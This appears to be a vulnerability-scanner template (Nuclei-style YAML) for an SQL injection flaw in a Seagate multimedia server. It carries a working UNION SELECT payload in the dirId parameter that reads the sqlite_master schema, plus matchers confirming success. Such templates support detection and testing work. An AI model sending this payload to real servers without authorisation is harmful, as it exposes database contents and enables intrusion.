id: Seagate-media-sqli

info:
  name: Seagate多媒体服务器sql注入漏洞
  author: Str1am
  severity: high
  tags: Seagate,sqli

requests:
  - method: GET
    path:
      - "{{BaseURL}}/folderViewAllFiles.psp?start=0&count=60&url=%2F&dirId=\\%27+union+select+null,name,null,sql,null,null+from+sqlite_master+--+"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "thumbUrl"
          - "parentdirId"
          - "CREATE TRIGGER"
        part: body
        condition: and
